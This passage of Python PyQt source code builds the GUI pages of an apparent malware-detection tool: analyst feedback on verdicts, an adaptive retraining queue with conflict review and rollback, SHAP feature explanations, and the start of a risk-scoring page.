            "\u2139  Tip: Select any row in the history table below and click "
            "\u201cReview Selected\u201d to pre-fill the form. "
            "FALSE_POSITIVE and FALSE_NEGATIVE corrections are automatically "
            "queued for ML retraining."
        )
        hint.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
        hint.setWordWrap(True)
        submit_form.addWidget(hint)

        self._fp_exclusion_lbl = QLabel("")
        self._fp_exclusion_lbl.setStyleSheet(f"color: {THEME['yellow']}; font-size: 10px; border: none;")
        submit_form.addWidget(self._fp_exclusion_lbl)

        inner_layout.addWidget(submit_grp)

        # ── History table ─────────────────────────────────────────────────
        grp = QGroupBox("Feedback History")
        grp_layout = QVBoxLayout(grp)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("\u21bb  Refresh")
        refresh_btn.setMinimumWidth(90)
        refresh_btn.clicked.connect(self._refresh_feedback_table)
        review_btn = QPushButton("\u270e  Review Selected")
        review_btn.setMinimumWidth(140)
        review_btn.clicked.connect(self._prefill_from_selection)
        export_btn = QPushButton("\U0001f4c4  Export CSV")
        export_btn.setMinimumWidth(110)
        export_btn.clicked.connect(self._export_feedback_csv)
        btn_row.addWidget(refresh_btn)
        btn_row.addWidget(review_btn)
        btn_row.addWidget(export_btn)
        btn_row.addStretch()
        grp_layout.addLayout(btn_row)

        self._feedback_table = make_table(
            ["Timestamp", "File", "SHA-256", "System Verdict", "Analyst", "Notes"],
            stretch_col=1
        )
        self._feedback_table.itemSelectionChanged.connect(self._on_feedback_selection)
        grp_layout.addWidget(self._feedback_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        self._refresh_feedback_table()
        return page

    def _on_analyst_verdict_change(self, text: str):
        """Show contextual hints when FP or FN is selected."""
        if text == "FALSE_POSITIVE":
            self._fp_exclusion_lbl.setText(
                "\u26a0  False Positive: file added to exclusions.txt + ML correction queued."
            )
        elif text == "FALSE_NEGATIVE":
            self._fp_exclusion_lbl.setText(
                "\u26a0  False Negative: file was malicious but missed — ML correction queued."
            )
        else:
            self._fp_exclusion_lbl.setText("")

    def _on_feedback_selection(self):
        pass  # selection handled in _prefill_from_selection

    def _prefill_from_selection(self):
        """Fill the submission form from the selected history row."""
        row = self._feedback_table.currentRow()
        if row < 0:
            return
        sha_item  = self._feedback_table.item(row, 2)
        file_item = self._feedback_table.item(row, 1)
        verd_item = self._feedback_table.item(row, 3)
        if sha_item:
            self._fb_sha_input.setText(sha_item.toolTip() or sha_item.text())
        if file_item:
            self._fb_fname_input.setText(file_item.text())
        if verd_item:
            idx = self._fb_verdict_combo.findText(verd_item.text())
            if idx >= 0:
                self._fb_verdict_combo.setCurrentIndex(idx)

    def _submit_feedback(self):
        """
        Validate and persist analyst feedback.
        Routes FP/FN corrections through submit_gui_correction() so they are
        automatically queued in the AdaptiveLearner for the next retraining session.
        """
        from modules import feedback as fb_mod
        sha     = self._fb_sha_input.text().strip()
        fname   = self._fb_fname_input.text().strip() or "Unknown"
        orig    = self._fb_verdict_combo.currentText()
        analyst = self._fb_analyst_combo.currentText()
        notes   = self._fb_notes_input.text().strip()

        if not sha:
            QMessageBox.warning(self, "Missing Hash", "Please enter a SHA-256 hash.")
            return
        if len(sha) not in (32, 40, 64):
            QMessageBox.warning(self, "Invalid Hash",
                "Hash must be 32 (MD5), 40 (SHA-1), or 64 (SHA-256) characters.")
            return
        if analyst in ("FALSE_POSITIVE", "FALSE_NEGATIVE") and not notes:
            QMessageBox.warning(self, "Notes Required",
                f"Please provide a reason when marking {analyst}.\n\n"
                "This is required for the audit trail and helps reviewers\n"
                "verify the correction before it trains the model.")
            return

        # Route through submit_gui_correction — this saves feedback AND queues
        # an ML correction if the verdict is FALSE_POSITIVE or FALSE_NEGATIVE.
        # file_path is empty here because the submission is manual (hash-only);
        # AdaptiveLearner will attempt re-extraction from the cache file path.
        fb_mod.submit_gui_correction(
            sha256=sha,
            filename=fname,
            file_path="",       # hash-only — learner will try re-extraction
            analyst_verdict=analyst,
            original_verdict=orig,
            notes=notes,
        )

        if analyst == "FALSE_POSITIVE":
            msg = (
                f"Marked as False Positive.\n'{fname}' added to exclusions.txt.\n\n"
                "Correction queued for next ML retraining session.\n"
                "Check the Adaptive Learning page to monitor queue status."
            )
        elif analyst == "FALSE_NEGATIVE":
            msg = (
                f"Marked as False Negative.\n\n"
                "Correction queued for next ML retraining session.\n"
                "Check the Adaptive Learning page to monitor queue status."
            )
        else:
            msg = "Verdict confirmed and logged."

        QMessageBox.information(self, "Feedback Saved", msg)

        # Clear form
        self._fb_sha_input.clear()
        self._fb_fname_input.clear()
        self._fb_notes_input.clear()
        self._fp_exclusion_lbl.setText("")
        self._refresh_feedback_table()
        self._refresh_dashboard()

    def _refresh_feedback_table(self):
        """Reload feedback history table and update stat cards."""
        from modules import feedback as fb_mod
        records = fb_mod.get_all_feedback(limit=200)
        stats   = fb_mod.get_feedback_stats()

        confirmed = stats.get("CONFIRMED", 0)
        fp        = stats.get("FALSE_POSITIVE", 0)
        total     = confirmed + fp
        fpr_val   = f"{fp / total * 100:.1f}%" if total > 0 else "0.0%"

        self._fb_stat_cards["total"].set_value(total)
        self._fb_stat_cards["confirmed"].set_value(confirmed)
        self._fb_stat_cards["fp"].set_value(fp)
        self._fb_stat_cards["fpr"].set_value(fpr_val)

        t = self._feedback_table
        t.setRowCount(0)
        for r in records:
            row = t.rowCount()
            t.insertRow(row)
            t.setItem(row, 0, table_item(r.get("timestamp", "")))
            t.setItem(row, 1, table_item(r.get("filename", "—")))
            sha = r.get("sha256", "")
            t.setItem(row, 2, table_item(sha[:24] + "\u2026" if len(sha) > 24 else sha))
            # Store full SHA in tooltip so _prefill_from_selection can retrieve it
            if t.item(row, 2):
                t.item(row, 2).setToolTip(sha)
            ov = r.get("original_verdict", "")
            t.setItem(row, 3, table_item(ov, verdict_color(ov)))
            av = r.get("analyst_verdict", "")
            av_color = THEME["red"] if av == "FALSE_POSITIVE" else THEME["green"] if av == "CONFIRMED" else THEME["muted"]
            t.setItem(row, 4, table_item(av, av_color))
            t.setItem(row, 5, table_item(r.get("notes", ""), THEME["muted"]))

    def _export_feedback_csv(self):
        """Export full feedback history to a CSV file."""
        import csv
        from modules import feedback as fb_mod
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Feedback CSV", "feedback_export.csv", "CSV Files (*.csv)"
        )
        if not path:
            return
        records = fb_mod.get_all_feedback(limit=10000)
        try:
            with open(path, "w", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=[
                    "timestamp", "sha256", "filename",
                    "original_verdict", "analyst_verdict", "notes"
                ])
                writer.writeheader()
                writer.writerows(records)
            QMessageBox.information(self, "Export Complete",
                f"Exported {len(records)} records to:\n{path}")
        except Exception as e:
            QMessageBox.critical(self, "Export Failed", str(e))


    # ── PAGE: ADAPTIVE LEARNING ───────────────────────────────────────────────

    def _build_adaptive_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🧠", "Adaptive Learning Engine",
            "Self-correcting ML with label-poisoning protection — review corrections before they train"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(14)

        # ── Stat cards ────────────────────────────────────────────────────────
        cards_row = QHBoxLayout()
        cards_row.setSpacing(10)
        self._al_cards = {}
        for label, key, color in [
            ("Pending (Validated)",   "pending_fp",      THEME["green"]),
            ("Awaiting Review",       "pending_review",  THEME["blue"]),
            ("⚠ Conflicted",          "conflicted",      THEME["red"]),
            ("Trained",               "trained",         THEME["muted"]),
            ("Revoked",               "revoked",         THEME["yellow"]),
        ]:
            card = StatCard(label, color)
            self._al_cards[key] = card
            cards_row.addWidget(card)
        inner_layout.addLayout(cards_row)

        # ── Anchor store cards ────────────────────────────────────────────────
        anchor_row = QHBoxLayout()
        anchor_row.setSpacing(10)
        self._anchor_cards = {}
        for label, key, color in [
            ("Anchor Samples Total", "total",    THEME["blue"]),
            ("Benign Anchors",       "benign",   THEME["green"]),
            ("Malicious Anchors",    "malicious", THEME["red"]),
        ]:
            card = StatCard(label, color)
            self._anchor_cards[key] = card
            anchor_row.addWidget(card)

        self._anchor_balance_lbl = QLabel("")
        self._anchor_balance_lbl.setStyleSheet(
            f"color: {THEME['muted']}; font-size: 10px; padding: 4px;"
        )
        anchor_row.addWidget(self._anchor_balance_lbl)
        anchor_row.addStretch()

        anchor_grp = QGroupBox(
            "Anchor Sample Store  —  confirmed verdicts used to prevent class imbalance during retraining"
        )
        anchor_grp_layout = QVBoxLayout(anchor_grp)
        anchor_grp_layout.addLayout(anchor_row)
        anchor_grp_layout.addWidget(QLabel(
            "  Anchors are registered automatically when you mark a verdict as CONFIRMED "
            "in the Analyst Feedback page.",
            styleSheet=f"color: {THEME['muted']}; font-size: 10px;"
        ))
        inner_layout.addWidget(anchor_grp)

        # ── Controls ──────────────────────────────────────────────────────────
        ctrl_grp = QGroupBox("Retraining Controls")
        ctrl_layout = QHBoxLayout(ctrl_grp)

        thresh_lbl = QLabel("Auto-retrain threshold:")
        thresh_lbl.setStyleSheet(f"color: {THEME['muted']}; border: none;")
        self._al_threshold = QSpinBox()
        self._al_threshold.setRange(2, 50)
        self._al_threshold.setValue(5)
        self._al_threshold.setToolTip(
            "Validated (PENDING) corrections needed to trigger automatic retraining."
        )
        self._al_threshold.setMinimumWidth(70)

        retrain_btn = QPushButton("🧠  Retrain Now")
        retrain_btn.setObjectName("primary")
        retrain_btn.setMinimumWidth(140)
        retrain_btn.clicked.connect(self._force_retrain)

        refresh_btn = QPushButton("↻  Refresh")
        refresh_btn.setMinimumWidth(90)
        refresh_btn.clicked.connect(self._refresh_adaptive)

        clear_btn = QPushButton("🗑  Clear Queue")
        clear_btn.setObjectName("danger")
        clear_btn.setMinimumWidth(120)
        clear_btn.clicked.connect(self._clear_learning_queue)

        ctrl_layout.addWidget(thresh_lbl)
        ctrl_layout.addWidget(self._al_threshold)
        ctrl_layout.addSpacing(12)
        ctrl_layout.addWidget(retrain_btn)
        ctrl_layout.addWidget(refresh_btn)
        ctrl_layout.addWidget(clear_btn)
        ctrl_layout.addStretch()
        inner_layout.addWidget(ctrl_grp)

        # ── Progress bar ──────────────────────────────────────────────────────
        prog_row = QHBoxLayout()
        prog_lbl = QLabel("Validated queue progress:")
        prog_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
        self._al_progress = QProgressBar()
        self._al_progress.setRange(0, 5)
        self._al_progress.setValue(0)
        self._al_progress.setFixedHeight(8)
        prog_row.addWidget(prog_lbl)
        prog_row.addWidget(self._al_progress)
        inner_layout.addLayout(prog_row)

        # ── Tabbed queue views ────────────────────────────────────────────────
        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane {{ border: 1px solid {THEME['border']}; }}")

        # Tab 1 — Conflicted corrections (require manual approval/rejection)
        conflict_widget = QWidget()
        conflict_layout = QVBoxLayout(conflict_widget)
        conflict_layout.setContentsMargins(8, 8, 8, 8)

        conflict_info = QLabel(
            "⚠  These corrections were flagged by automated conflict detection. "
            "Review each one carefully before approving or rejecting. "
            "Approved corrections move to the PENDING queue for training. "
            "Rejected corrections are permanently revoked."
        )
        conflict_info.setWordWrap(True)
        conflict_info.setStyleSheet(
            f"color: {THEME['yellow']}; font-size: 10px; "
            f"background: rgba(210,153,34,0.10); border: 1px solid {THEME['yellow']}; "
            f"border-radius: 4px; padding: 8px;"
        )
        conflict_layout.addWidget(conflict_info)

        conflict_btn_row = QHBoxLayout()
        approve_btn = QPushButton("✓  Approve Selected")
        approve_btn.setObjectName("success")
        approve_btn.setMinimumWidth(160)
        approve_btn.clicked.connect(self._approve_selected_conflict)
        reject_btn = QPushButton("✗  Reject Selected")
        reject_btn.setObjectName("danger")
        reject_btn.setMinimumWidth(150)
        reject_btn.clicked.connect(self._reject_selected_conflict)
        conflict_btn_row.addWidget(approve_btn)
        conflict_btn_row.addWidget(reject_btn)
        conflict_btn_row.addStretch()
        conflict_layout.addLayout(conflict_btn_row)

        self._conflict_table = make_table(
            ["ID", "File", "Type", "Original Verdict", "Conflict Reason", "Queued At"],
            stretch_col=4,
            wrap_last=True,
        )
        conflict_layout.addWidget(self._conflict_table)
        tabs.addTab(conflict_widget, "⚠  Conflicted")

        # Tab 2 — All queue items with revocation
        all_widget = QWidget()
        all_layout = QVBoxLayout(all_widget)
        all_layout.setContentsMargins(8, 8, 8, 8)

        revoke_row = QHBoxLayout()
        revoke_btn = QPushButton("↩  Revoke Selected")
        revoke_btn.setObjectName("danger")
        revoke_btn.setMinimumWidth(160)
        revoke_btn.setToolTip(
            "Revoke a PENDING correction before it trains.\n"
            "If already TRAINED, the model is automatically rolled back."
        )
        revoke_btn.clicked.connect(self._revoke_selected)
        revoke_row.addWidget(revoke_btn)
        revoke_row.addStretch()
        all_layout.addLayout(revoke_row)

        self._all_queue_table = make_table(
            ["ID", "File", "Type", "Status", "Original Verdict", "Notes", "Queued At"],
            stretch_col=1
        )
        all_layout.addWidget(self._all_queue_table)
        tabs.addTab(all_widget, "📋  All Corrections")

        # Tab 3 — Retraining session history
        hist_widget = QWidget()
        hist_layout = QVBoxLayout(hist_widget)
        hist_layout.setContentsMargins(8, 8, 8, 8)
        self._al_history_table = make_table(
            ["Session ID", "Samples", "FP Fixed", "FN Fixed", "Trees Added", "Outcome", "Timestamp"],
            stretch_col=0
        )
        hist_layout.addWidget(self._al_history_table)
        tabs.addTab(hist_widget, "📈  Retraining History")

        inner_layout.addWidget(tabs, 1)

        # ── Console ───────────────────────────────────────────────────────────
        self._al_console = ConsoleWidget()
        self._al_console.setMaximumHeight(130)
        self._al_console.append_line(
            "● Adaptive Learning Engine ready. Corrections from the Analyst Feedback "
            "page are validated here before training.", THEME["muted"]
        )
        inner_layout.addWidget(self._al_console)

        layout.addWidget(inner, 1)
        QTimer.singleShot(200, self._refresh_adaptive)
        return page

    def _refresh_adaptive(self):
        try:
            from modules.adaptive_learner import get_learner
            learner = get_learner()
            learner.threshold = self._al_threshold.value()

            summary = learner.get_queue_summary()
            pending_total = summary.get("pending_fp", 0) + summary.get("pending_fn", 0)
            self._al_cards["pending_fp"].set_value(pending_total)
            for key in ("pending_review", "conflicted", "trained", "revoked"):
                self._al_cards[key].set_value(summary.get(key, 0))

            thresh = self._al_threshold.value()
            self._al_progress.setRange(0, thresh)
            self._al_progress.setValue(min(pending_total, thresh))

            # Anchor store stats
            anchor_stats = learner.get_anchor_stats()
            for key, card in self._anchor_cards.items():
                card.set_value(anchor_stats.get(key, 0))

            # Ready-to-train status with detailed guidance
            ready        = anchor_stats.get("ready_to_train", False)
            balanced     = anchor_stats.get("balanced", False)
            benign_count = anchor_stats.get("benign", 0)
            mal_count    = anchor_stats.get("malicious", 0)
            min_needed   = anchor_stats.get("min_per_class", 5)
            stale_count  = anchor_stats.get("stale", 0)
            expired      = anchor_stats.get("expired", 0)

            if not ready:
                benign_needed = max(0, min_needed - benign_count)
                mal_needed    = max(0, min_needed - mal_count)
                parts = []
                if benign_needed > 0:
                    parts.append(f"{benign_needed} more SAFE confirmations needed")
                if mal_needed > 0:
                    parts.append(f"{mal_needed} more MALICIOUS confirmations needed")
                msg = f"⛔ Retraining blocked: {' and '.join(parts)}"
                self._anchor_balance_lbl.setText(msg)
                self._anchor_balance_lbl.setStyleSheet(
                    f"color: {THEME['red']}; font-size: 10px; padding: 4px;"
                )
            elif not balanced:
                msg = "⚠ Anchor store imbalanced — confirm more of the minority class"
                self._anchor_balance_lbl.setText(msg)
                self._anchor_balance_lbl.setStyleSheet(
                    f"color: {THEME['yellow']}; font-size: 10px; padding: 4px;"
                )
            else:
                extra = []
                if stale_count > 0:
                    extra.append(f"{stale_count} anchors older than {anchor_stats.get('recent_days',90)}d")
                if expired > 0:
                    extra.append(f"{expired} expired")
                msg = "✓ Anchor store ready for safe retraining"
                if extra:
                    msg += f"  ({', '.join(extra)})"
                self._anchor_balance_lbl.setText(msg)
                self._anchor_balance_lbl.setStyleSheet(
                    f"color: {THEME['green']}; font-size: 10px; padding: 4px;"
                )

            # Conflict table
            conflicts = learner.get_queue_items(status_filter="CONFLICTED", limit=50)
            t = self._conflict_table
            t.setRowCount(0)
            for r in conflicts:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(str(r["id"]), THEME["muted"]))
                t.setItem(row, 1, table_item(r.get("filename", "—")))
                ctype = r.get("correction_type", "")
                t.setItem(row, 2, table_item(ctype,
                    THEME["yellow"] if ctype == "FALSE_POSITIVE" else THEME["red"]
                ))
                t.setItem(row, 3, table_item(r.get("original_verdict", "")))
                t.setItem(row, 4, table_item(r.get("conflict_reason", ""), THEME["yellow"]))
                t.setItem(row, 5, table_item(r.get("queued_at", "")))

            # All corrections table
            all_items = learner.get_queue_items(limit=100)
            t2 = self._all_queue_table
            t2.setRowCount(0)
            status_colors = {
                "PENDING":        THEME["green"],
                "PENDING_REVIEW": THEME["blue"],
                "CONFLICTED":     THEME["yellow"],
                "TRAINED":        THEME["muted"],
                "REVOKED":        THEME["red"],
                "SKIPPED":        THEME["muted"],
            }
            for r in all_items:
                row = t2.rowCount(); t2.insertRow(row)
                st = r.get("status", "")
                t2.setItem(row, 0, table_item(str(r["id"]), THEME["muted"]))
                t2.setItem(row, 1, table_item(r.get("filename", "—")))
                t2.setItem(row, 2, table_item(r.get("correction_type", "")))
                t2.setItem(row, 3, table_item(st, status_colors.get(st, THEME["text"])))
                t2.setItem(row, 4, table_item(r.get("original_verdict", "")))
                t2.setItem(row, 5, table_item(r.get("analyst_notes", ""), THEME["muted"]))
                t2.setItem(row, 6, table_item(r.get("queued_at", "")))

            # History table
            history = learner.get_retraining_history(limit=30)
            t3 = self._al_history_table
            t3.setRowCount(0)
            for r in history:
                row = t3.rowCount(); t3.insertRow(row)
                outcome = r.get("outcome", "")
                t3.setItem(row, 0, table_item(r.get("session_id", "")))
                t3.setItem(row, 1, table_item(str(r.get("samples_used", 0))))
                t3.setItem(row, 2, table_item(str(r.get("fp_corrections", 0)), THEME["yellow"]))
                t3.setItem(row, 3, table_item(str(r.get("fn_corrections", 0)), THEME["red"]))
                t3.setItem(row, 4, table_item(str(r.get("new_trees_added", 0)), THEME["blue"]))
                t3.setItem(row, 5, table_item(outcome,
                    THEME["green"] if outcome == "SUCCESS"
                    else THEME["yellow"] if outcome == "SKIPPED"
                    else THEME["red"]
                ))
                t3.setItem(row, 6, table_item(r.get("timestamp", "")))

        except Exception as e:
            self._al_console.append_line(f"[-] Refresh error: {e}", THEME["red"])

    def _get_selected_queue_id(self, table: "QTableWidget") -> int | None:
        """Extracts queue ID from the first column of the selected row."""
        row = table.currentRow()
        if row < 0:
            return None
        item = table.item(row, 0)
        if not item:
            return None
        try:
            return int(item.text())
        except ValueError:
            return None

    def _approve_selected_conflict(self):
        qid = self._get_selected_queue_id(self._conflict_table)
        if qid is None:
            QMessageBox.warning(self, "No Selection", "Select a conflicted correction first.")
            return
        reply = QMessageBox.question(
            self, "Approve Correction",
            f"Approve correction ID {qid}?\n\n"
            "It will move to PENDING and be included in the next retraining session.\n"
            "Only approve if you have verified the label is correct.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            try:
                from modules.adaptive_learner import get_learner
                ok = get_learner().approve_conflicted(qid)
                if ok:
                    self._al_console.append_line(
                        f"[+] Correction {qid} approved → PENDING.", THEME["green"]
                    )
                else:
                    self._al_console.append_line(
                        f"[-] Could not approve correction {qid}.", THEME["red"]
                    )
                self._refresh_adaptive()
            except Exception as e:
                self._al_console.append_line(f"[-] Approve error: {e}", THEME["red"])

    def _reject_selected_conflict(self):
        qid = self._get_selected_queue_id(self._conflict_table)
        if qid is None:
            QMessageBox.warning(self, "No Selection", "Select a conflicted correction first.")
            return
        reply = QMessageBox.question(
            self, "Reject Correction",
            f"Permanently reject and revoke correction ID {qid}?\n\n"
            "This correction will never be used for training.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            try:
                from modules.adaptive_learner import get_learner
                ok = get_learner().reject_conflicted(qid, "Rejected via GUI review.")
                if ok:
                    self._al_console.append_line(
                        f"[*] Correction {qid} rejected → REVOKED.", THEME["yellow"]
                    )
                else:
                    self._al_console.append_line(
                        f"[-] Could not reject correction {qid}.", THEME["red"]
                    )
                self._refresh_adaptive()
            except Exception as e:
                self._al_console.append_line(f"[-] Reject error: {e}", THEME["red"])

    def _revoke_selected(self):
        qid = self._get_selected_queue_id(self._all_queue_table)
        if qid is None:
            QMessageBox.warning(self, "No Selection", "Select a correction to revoke.")
            return
        reply = QMessageBox.warning(
            self, "Revoke Correction",
            f"Revoke correction ID {qid}?\n\n"
            "• If PENDING: removed from queue, will not train.\n"
            "• If TRAINED: model will be rolled back to the snapshot\n"
            "  taken before that training session.\n\n"
            "This cannot be undone.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            try:
                from modules.adaptive_learner import get_learner
                result = get_learner().revoke_correction(qid)
                if result["revoked"]:
                    msg = f"[+] Correction {qid} revoked. {result['message']}"
                    color = THEME["yellow"]
                    if result["rollback_performed"]:
                        msg += f"\n[!] Model rolled back to: {result['backup_used']}"
                        color = THEME["red"]
                    self._al_console.append_line(msg, color)
                else:
                    self._al_console.append_line(
                        f"[-] Revoke failed: {result['message']}", THEME["red"]
                    )
                self._refresh_adaptive()
            except Exception as e:
                self._al_console.append_line(f"[-] Revoke error: {e}", THEME["red"])

    def _force_retrain(self):
        self._al_console.clear_console()

        # Warn analyst if anchor store is not ready — Force Retrain bypasses the
        # threshold block but the analyst should know the risk.
        try:
            from modules.adaptive_learner import get_learner, MIN_ANCHORS_PER_CLASS
            stats = get_learner().get_anchor_stats()
            if not stats.get("ready_to_train", False):
                benign = stats.get("benign", 0)
                mal    = stats.get("malicious", 0)
                self._al_console.append_line(
                    f"⚠ WARNING: Anchor store insufficient "
                    f"({benign} benign, {mal} malicious — need {MIN_ANCHORS_PER_CLASS} each).",
                    THEME["yellow"]
                )
                self._al_console.append_line(
                    "   Proceeding anyway (Force Retrain overrides safety check).",
                    THEME["yellow"]
                )
                self._al_console.append_line(
                    "   Class imbalance risk is ELEVATED. "
                    "Confirm more verdicts in Analyst Feedback after retraining.",
                    THEME["muted"]
                )
            elif not stats.get("balanced", True):
                self._al_console.append_line(
                    f"⚠ WARNING: Anchor store imbalanced "
                    f"({stats.get('benign',0)} benign vs {stats.get('malicious',0)} malicious).",
                    THEME["yellow"]
                )
        except Exception:
            pass

        self._al_console.append_line("[*] Starting forced retraining session...", THEME["blue"])

        def _do():
            from modules.adaptive_learner import get_learner
            learner = get_learner()
            learner.threshold = self._al_threshold.value()
            return learner.force_retrain()

        worker = GenericWorker(_do)
        worker.line_out.connect(self._al_console.append_line)
        worker.finished.connect(self._retrain_done)
        self._workers.append(worker)
        worker.start()

    def _retrain_done(self, result):
        if not result:
            self._al_console.append_line("[-] Retraining returned no result.", THEME["red"])
            return
        outcome = result.get("outcome", "UNKNOWN")
        if outcome == "SUCCESS":
            self._al_console.append_line(
                f"[+] Retraining complete — {result.get('new_trees_added', 0)} new trees added. "
                f"Model reloads automatically on next scan.", THEME["green"]
            )
        elif outcome == "SKIPPED":
            self._al_console.append_line(
                f"[*] Retraining skipped: {result.get('error_message', '')}", THEME["yellow"]
            )
        else:
            self._al_console.append_line(
                f"[-] Retraining failed: {result.get('error_message', '')}", THEME["red"]
            )
        self._refresh_adaptive()

    def _clear_learning_queue(self):
        reply = QMessageBox.warning(
            self, "Clear Learning Queue",
            "Remove all PENDING and PENDING_REVIEW corrections?\n"
            "Trained and revoked entries are not affected.\n\nProceed?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            try:
                from modules.adaptive_learner import get_learner
                get_learner().clear_queue()
                self._al_console.append_line("[+] Learning queue cleared.", THEME["yellow"])
                self._refresh_adaptive()
            except Exception as e:
                self._al_console.append_line(f"[-] Clear failed: {e}", THEME["red"])



    # ── PAGE: EXPLAINABILITY ──────────────────────────────────────────────────

    def _build_explainability_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔍", "SHAP Explainability Engine",
            "Feature attribution — why did the ML engine produce this verdict?"
        ))

        inner = QWidget()
        il = QVBoxLayout(inner)
        il.setContentsMargins(24, 20, 24, 20)
        il.setSpacing(12)

        info = QLabel(
            "SHAP (SHapley Additive exPlanations) computes each feature's individual "
            "contribution to the ML verdict using cooperative game theory. "
            "Positive values push toward MALICIOUS. Negative values push toward SAFE."
        )
        info.setWordWrap(True)
        info.setStyleSheet(
            f"color: {THEME['muted']}; font-size: 11px; "
            f"background: {THEME['surface']}; border: 1px solid {THEME['border']}; "
            f"border-radius: 5px; padding: 10px;"
        )
        il.addWidget(info)

        if_warn = QLabel(
            "⚠  Requires: pip install shap    "
            "If SHAP is not installed, this page shows no data."
        )
        if_warn.setStyleSheet(f"color: {THEME['yellow']}; font-size: 10px;")
        il.addWidget(if_warn)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh")
        refresh_btn.setObjectName("primary")
        refresh_btn.setMinimumWidth(110)
        refresh_btn.clicked.connect(self._refresh_explainability)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()
        il.addLayout(btn_row)

        # Top features table
        grp1 = QGroupBox("Recent SHAP Explanations")
        g1l  = QVBoxLayout(grp1)
        self._shap_history_table = make_table(
            ["Timestamp", "File", "Verdict", "Score", "Top Feature", "Direction"],
            stretch_col=4
        )
        g1l.addWidget(self._shap_history_table)
        il.addWidget(grp1, 1)

        # Detail panel — click a row to expand
        grp2 = QGroupBox("Feature Attribution Detail (click a row above)")
        g2l  = QVBoxLayout(grp2)
        self._shap_detail_table = make_table(
            ["Feature", "SHAP Value", "Direction", "Magnitude"],
            stretch_col=0
        )
        g2l.addWidget(self._shap_detail_table)
        il.addWidget(grp2, 1)

        self._shap_history_table.itemSelectionChanged.connect(
            self._on_shap_row_selected
        )
        self._shap_rows_data = []

        layout.addWidget(inner, 1)
        QTimer.singleShot(300, self._refresh_explainability)
        return page

    def _refresh_explainability(self):
        try:
            from modules.explainability import get_explainer
            records = get_explainer().get_recent_explanations(limit=50)
            self._shap_rows_data = records
            t = self._shap_history_table
            t.setRowCount(0)
            if not records:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(
                    "No SHAP explanations yet. Run a file scan with thrember+shap installed.",
                    THEME["muted"]
                ))
                for i in range(1, 6): t.setItem(row, i, table_item(""))
                return
            for r in records:
                top = r["top_features"][0] if r["top_features"] else {}
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(r["timestamp"]))
                t.setItem(row, 1, table_item(r["filename"]))
                vc = THEME["red"] if "CRITICAL" in (r["verdict"] or "") else THEME["green"]
                t.setItem(row, 2, table_item(r["verdict"], vc))
                t.setItem(row, 3, table_item(f"{r['score']:.3f}"))
                t.setItem(row, 4, table_item(top.get("feature", "—")[:50]))
                d = top.get("direction", "—")
                dc = THEME["red"] if "malicious" in d else THEME["green"]
                t.setItem(row, 5, table_item(d, dc))
        except Exception as e:
            pass

    def _on_shap_row_selected(self):
        row = self._shap_history_table.currentRow()
        if row < 0 or row >= len(self._shap_rows_data):
            return
        record = self._shap_rows_data[row]
        t = self._shap_detail_table
        t.setRowCount(0)
        for feat in record.get("top_features", []):
            r = t.rowCount(); t.insertRow(r)
            t.setItem(r, 0, table_item(feat["feature"]))
            sv = feat["shap_value"]
            t.setItem(r, 1, table_item(f"{sv:+.4f}",
                THEME["red"] if sv > 0 else THEME["green"]))
            t.setItem(r, 2, table_item(feat["direction"]))
            t.setItem(r, 3, table_item(f"{feat['magnitude']:.4f}"))

    # ── PAGE: DYNAMIC RISK SCORES ─────────────────────────────────────────────

    def _build_risk_scores_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "⚡", "Dynamic Risk Scoring Engine",
            "Context-aware composite risk score — combines verdict, time, threat context, and baseline"
        ))

        inner = QWidget()
        il = QVBoxLayout(inner)
        il.setContentsMargins(24, 20, 24, 20)
        il.setSpacing(12)

        info = QLabel(
            "The Dynamic Risk Score (DRS) combines six signals: ML verdict probability (45%), "
            "time-of-day anomaly (10%), concurrent active threats (15%), "
            "attack chain presence (15%), network activity (10%), and baseline deviation (5%). "
            "It answers: how urgent is this alert right now on this machine?"
        )
        info.setWordWrap(True)
        info.setStyleSheet(
            f"color: {THEME['muted']}; font-size: 11px; "
            f"background: {THEME['surface']}; border: 1px solid {THEME['border']}; "
            f"border-radius: 5px; padding: 10px;"
        )
        il.addWidget(info)

        # Stat cards
        cards_row = QHBoxLayout()
        self._drs_cards = {}
        for label, key, color in [
            ("Critical DRS",  "critical", THEME["red"]),
            ("High DRS",      "high",     THEME["yellow"]),
            ("Medium DRS",    "medium",   THEME["blue"]),
            ("Low DRS",       "low",      THEME["green"]),
        ]:
            card = StatCard(label, color)
            self._drs_cards[key] = card
            cards_row.addWidget(card)
        il.addLayout(cards_row)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh")
        refresh_btn.setObjectName("primary")
        refresh_btn.setMinimumWidth(110)
        refresh_btn.clicked.connect(self._refresh_risk_scores)
        btn_row.addWidget(refresh_btn)
